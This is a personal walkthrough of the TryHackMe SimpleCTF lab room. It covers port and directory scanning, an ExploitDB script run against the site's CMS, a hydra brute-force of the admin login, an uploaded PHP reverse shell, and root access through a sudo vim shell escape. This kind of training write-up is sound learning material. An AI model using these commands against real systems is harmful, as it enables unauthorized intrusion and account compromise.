## TryHackMe - [SimpleCTF](https://tryhackme.com/room/simplectf)
> Completed 28th June  2022.

This box ended up being an interesting less than straight forward boot2root exercise. I found myself struggling again once I needed to explore for privilege escalation vectors.

---
### Environment
#### Operating System
- Latest kali-VM rolling update

#### Tools
- Nmap
- Gobuster
- Hydra
- ExploitDB
- Metasploit / Netcat listener

---
### Methodology
#### Objectives/Flags
1. user flag
2. root flag

---
#### Reconnaissance
Started off by scanning the target for open ports and services.
```bash
nmap -T4 -Pn -sV <TargetIP>
```
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
This revealed a web server that we can enumerate and an ssh service running on a custom port of `2222`. When navigating to the URL of the webserver we a met with a default Apache page which could hint at unconventional file structure. I loaded up `Gobuster` and got it to work scanning for directories. The wordlist used was `httparchive_directories_1m_2021_04_28.txt` which can be found [here](https://wordlists.assetnote.io/).
```bash
gobuster dir --url http://<TargetIP>/ -w <Wordlist> > <Outputfile>
```
```
//simple              (Status: 301) [Size: 313] [--> http://<TargetIP>/simple/]
```
Once we navigate to the `simple` directory, we are met with a webpage that appears be built using a CMS framework. We find a clue which may indicate that a user `mitch` exists on this machine. From here set `Gobuster` up to scan the new directory as I started walking through the page-source and hyperlinks and discover an admin login portal.
```bash
gobuster dir --url http://<TargetIP>/simple -w <Wordlist> > <Outputfile>
```
```
//uploads             (Status: 301) [Size: 319] [--> http://10.10.7.140/simple/uploads/]
//admin               (Status: 301) [Size: 317] [--> http://10.10.7.140/simple/admin/]    
```

After searching the CMS framework version on ExploitDB, a script is suggested to us to take advantage of a vulnerability in the framework. The script required some tweaking to its syntax to get it to run properly.
```bash
python 46635.py -u http://<TargetIP>/simple/
```
```
[+] Salt for password found: 1dac0d92e9fa6bb2.
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```
The script confirms user `mitch` is present on the target and reveals to us an admin email address. Unfortunately, the exploit failed to crack the password because of an unknown error. Due to my limited knowledge, I couldn't remediate it.
As a work around I tried to put hydra to work for some old-fashioned brute force. While this is not a realistic option, I've wanted to see it in action for this scenario.
```bash
hydra -l mitch -P <wordlist> <TargetIP> http-post-form "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:S=302"
```
```
[80][http-post-form] host: 10.10.194.228   login: mitch   password: secret
```
With the password found, I found an administration panel in where files are able to be uploaded. 
#### Weaponization 
- N/A

#### Delivery
- N/A

#### Exploitation
Here I prepped a `.phptml` file shell and uploaded it to the server. Once I set up a listener and navigated to the malicious file through the URL, the reverse shell fired.
```bash
id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Installation 
- N/A

#### Command & Control
- N/A

#### Actions on Objective
Here I managed to discover that VIM was set up with incorrect permissions that would allow me to privesc by executing bash.
```
sudo -l
  User mitch may run the following commands on Machine:
  (root) NOPASSWD: /usr/bin/vim
```
```bash
sudo vim
```
```vim
:!bash
```
```bash
id
  uid=0(root) gid=0(root) groups=0(root)
```

Once I made it to root, searching for loot went without a hitch.
```
cat /home/mitch/user.txt
  THM{***}
cat /root/root.txt
  THM{***}
```

---
### After-action
#### What I've learned
- There wasn't much to take away from this box up until I hit the need for privilege escalation. I spent some time scratching my head until I found the misconfigured permissions for VIM. This was the first time I've used VIM and I'd have to say it seems unnecessarily complicated.

#### What I would've done differently
- N/A

